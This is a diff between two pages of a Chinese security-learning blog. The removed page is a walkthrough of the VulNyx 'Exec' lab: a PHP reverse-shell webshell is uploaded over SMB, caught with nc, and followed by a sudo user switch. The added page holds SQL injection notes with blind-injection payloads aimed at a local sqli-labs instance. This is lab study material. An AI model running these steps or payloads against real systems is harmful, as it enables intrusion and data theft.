@@ -4,15 +4,22 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="VulNyx-Exec | 靶机, 网络安全 深度学习 ">
+    <meta name="keywords" content="sql注入 | 渗透测试, 网络安全 深度学习 ">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="
-arp-scan -l扫出目标ip192.168.193.130
-用nmap对ip进行快速扫描端口-sS使用tcp syn 扫描 -sV进行版本探测 -T5是快速扫描级别最高级  -A是全面扫描 -p-是端口扫描
+    <meta name="description" content=" 
+SQL注入Web漏洞两大关键因素：
 
-nmap -sS -s">
+参数可控向应用传递的参数用户可以控制
+
+后台执行用户向应用传递了参数后，后台将参数执行
+
+
+注入步骤
+单引号，判断注入点数据类型，int、string
+
+and或者or进行逻辑判断，是否可以执行逻辑">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +27,7 @@ nmap -sS -s">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>VulNyx-Exec | 靶机 | 蒋富勤的博客</title>
+    <title>sql注入 | 渗透测试 | 蒋富勤的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -333,13 +340,13 @@ nmap -sS -s">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/27.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        VulNyx-Exec | 靶机
+                        sql注入 | 渗透测试
                     </div>
                 </div>
             </div>
@@ -462,8 +469,8 @@ nmap -sS -s">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/靶机打靶/" class="post-category" target="_blank">
-                            靶机打靶
+                        <a href="/categories/渗透学习/" class="post-category" target="_blank">
+                            渗透学习
                         </a>
                         
                     </div>
@@ -488,14 +495,14 @@ nmap -sS -s">
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    390
+                    532
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
                 
@@ -511,40 +518,66 @@ nmap -sS -s">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="/medias/%5Cfeatureimages%5C15.jpg" alt></p>
-<h1 id="arp-scan-l扫出目标ip"><a href="#arp-scan-l扫出目标ip" class="headerlink" title="arp-scan -l扫出目标ip"></a>arp-scan -l扫出目标ip</h1><p>192.168.193.130</p>
-<h1 id="用nmap对ip进行快速扫描端口"><a href="#用nmap对ip进行快速扫描端口" class="headerlink" title="用nmap对ip进行快速扫描端口"></a>用nmap对ip进行快速扫描端口</h1><p>-sS使用tcp syn 扫描 -sV进行版本探测 -T5是快速扫描级别最高级  -A是全面扫描 -p-是端口扫描</p>
-<blockquote>
-<p>nmap -sS -sV -T5 -A -p- 192.168.193.130</p>
-</blockquote>
-<p>扫描出22 80 139 445端口 ，有80端口，我们可以去浏览器看看有没有http网页，发现有html网页</p>
-<p>我们可以用smbclient来查看有什么共享的资源用</p>
-<blockquote>
-<p>smbclient -L //192.168.193.130</p>
-</blockquote>
-<p>看到有个server<br>让后可以用smbclient 与服务器进行交互连接</p>
-<blockquote>
-<p>smbclient //192.168.193.130/server</p>
-</blockquote>
-<h2 id="然后连接到smb服务器"><a href="#然后连接到smb服务器" class="headerlink" title="然后连接到smb服务器"></a>然后连接到smb服务器</h2><h2 id="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个"><a href="#然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个" class="headerlink" title="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个"></a>然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个</h2><p>反弹webshell的a.php文件木马，</p>
-<blockquote>
-<p>/usr/share/webshells/php/php-reverse-shell a.php</p>
-</blockquote>
-<p>让后用连接的smb把木马文件上传</p>
-<blockquote>
-<p>put a.php</p>
-</blockquote>
-<h2 id="上传木马后，我们用nc-lp-1234-对目标进行监听"><a href="#上传木马后，我们用nc-lp-1234-对目标进行监听" class="headerlink" title="上传木马后，我们用nc -lp 1234 对目标进行监听"></a>上传木马后，我们用nc -lp 1234 对目标进行监听</h2><p>然后我们去浏览器，访问一下我们上传的木马<br>把shell反弹过来</p>
-<blockquote>
-<p>192.168.193.130/a.php<br>让后监听成功，可以用/usr/bin/script -qc /bin/bash /dev/null这个命令进入shell模式<br>/usr/bin/script -qc /bin/bash /dev/null</p>
-</blockquote>
-<p>然后我们使用</p>
-<blockquote>
-<p>sudo -l<br>看下换个身份执行命令看到（s3cur4）这个用户<br>然后我们用这个用户执行命令<br>sudo -us3cur4 bash</p>
-</blockquote>
-<h2 id="然后我们cd到家目录"><a href="#然后我们cd到家目录" class="headerlink" title="然后我们cd到家目录"></a>然后我们cd到家目录</h2><blockquote>
-<p>cd<br>ls<br>cat user.txt<br>看一下文件内容夺取成功</p>
-</blockquote>
+                <p> <img src="/medias/%5Cfeatureimages%5C26.jpg" alt></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>Web漏洞两大关键因素：</p>
+<ol>
+<li><p>参数可控<br>向应用传递的参数用户可以控制</p>
+</li>
+<li><p>后台执行<br>用户向应用传递了参数后，后台将参数执行</p>
+</li>
+</ol>
+<h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol>
+<li><p>单引号，判断注入点数据类型，int、string</p>
+</li>
+<li><p>and或者or进行逻辑判断，是否可以执行逻辑</p>
+</li>
+<li><p>order by 判断有多少列</p>
+</li>
+<li><p>通过union select 1,2,3判断显示位，是原本的输出不影响判断</p>
+</li>
+<li><p>查库、表、列三级结构<br>information_schema</p>
+<ul>
+<li>schemata用于查询库名 schema_name</li>
+<li>tables用于查询表名 table_name</li>
+<li>columns用于查询列名 column_name</li>
+</ul>
+</li>
+<li><p>查询列内容<br>select 列名 from 库名.表名 where 限定条件</p>
+</li>
+</ol>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
+<li>MySQL版本5.0以下，不支持报错注入，也没有information_schema库</li>
+<li>extractvalue() updatexml()有32位长度限制</li>
+</ul>
+<h2 id="为什么使用报错注入"><a href="#为什么使用报错注入" class="headerlink" title="为什么使用报错注入"></a>为什么使用报错注入</h2><ol>
+<li>union被过滤</li>
+<li>无论正确与否，都不显示结果</li>
+<li>当语句错误，有错误提示 mysql_error()</li>
+</ol>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>使用length()/substr()/ascii()查询数据库名需要几步</p>
+<ol>
+<li>select length(database())&gt;10;//长度为8</li>
+<li>select ascii(substr(database(),$num,1))=10;//不断的取ascii码,$num从1~8</li>
+<li>查询</li>
+</ol>
+<p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr(database(),1,1)) =115–+</p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr(database(),n,1)) =ascii–+<br>变量1是n，变量2是ascii<br>n的取值范围，ascii的取值范围<br>n：1<del>8<br>ascii：97</del>122</p>
+<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>不依赖回显，依赖于延迟</p>
+<p>if(条件,sleep(1),sleep(2))</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>什么时候用报错注入，有mysql_error()，有报错的时候可以使用</li>
+<li>什么时候用布尔注入，可以进行条件判断，and/or，true/false</li>
+<li>什么时候用时间盲注，当没回显，不知道正确与否，但是执行sleep后浏览器会有延迟<br>核心：还是查询语句<br>区别：利用函数的不同，显示方式的不同</li>
+</ol>
+<h2 id="实践案例"><a href="#实践案例" class="headerlink" title="实践案例"></a>实践案例</h2><ol>
+<li><p>DVWA网站的bind sql injection<br>低中高三个级别<br>根据已有（where）的库表结构，查列</p>
+</li>
+<li><p>sqli-labs的less8和less9<br>根据已有（where）的库表结构，查列</p>
+</li>
+<li><p>源码分析<br>截取关键语句，截图配说明</p>
+</li>
+</ol>
+<h2 id="预习"><a href="#预习" class="headerlink" title="预习"></a>预习</h2><p>sqlmap使用，从github下载</p>
 
             </div>
             <hr />
@@ -703,9 +736,9 @@ nmap -sS -s">
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《VulNyx-Exec | 靶机》
+                    《sql注入 | 渗透测试》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2023/01/14/wp-2/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2023/01/14/sqlzhuru/" property="cc:attributionName"
                rel="cc:attributionURL">
                 JFQ
             </a> 采用
@@ -746,7 +779,7 @@ nmap -sS -s">
         repo: 'jjfacq.github.io',
         owner: 'jjfacq',
         admin: "jjfacq",
-        id: '2023/01/14/wp-2/',
+        id: '2023/01/14/sqlzhuru/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1033,30 +1066,20 @@ nmap -sS -s">
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/01/14/sqlzhuru/">
+                <a href="/2023/01/14/lwaq/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="sql注入 | 渗透测试">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="2024 | 网络安全">
                         
-                        <span class="card-title">sql注入 | 渗透测试</span>
+                        <span class="card-title">2024 | 网络安全</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                             
-SQL注入Web漏洞两大关键因素：
-
-参数可控向应用传递的参数用户可以控制
-
-后台执行用户向应用传递了参数后，后台将参数执行
-
-
-注入步骤
-单引号，判断注入点数据类型，int、string
-
-and或者or进行逻辑判断，是否可以执行逻辑
+                            
+网络安全技术6.VPN 技术    VPN定义：虚拟专用网(Virtual Private Network)是一种“通过共享的公共网络建立私有的数据通道，将各个需要接入这张虚拟网的网络或终端通过通道连接起来，构成一个专用的、具有一定安全
                         
                     </div>
                     <div class="publish-info">
@@ -1067,8 +1090,8 @@ and或者or进行逻辑判断，是否可以执行逻辑
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/渗透学习/" class="post-category" target="_blank">
-                                    渗透学习
+                            <a href="/categories/网络安全/" class="post-category" target="_blank">
+                                    网络安全
                                 </a>
                             
                             
@@ -1078,8 +1101,8 @@ and或者or进行逻辑判断，是否可以执行逻辑
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/渗透测试/" target="_blank">
-                        <span class="chip bg-color">渗透测试</span>
+                    <a href="/tags/网络安全/" target="_blank">
+                        <span class="chip bg-color">网络安全</span>
                     </a>
                     
                 </div>
@@ -1090,7 +1113,7 @@ and或者or进行逻辑判断，是否可以执行逻辑
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="fa fa-dot-circle-o"></i>
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2023/01/14/wp-2/">
@@ -1128,7 +1151,6 @@ nmap -sS -s
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
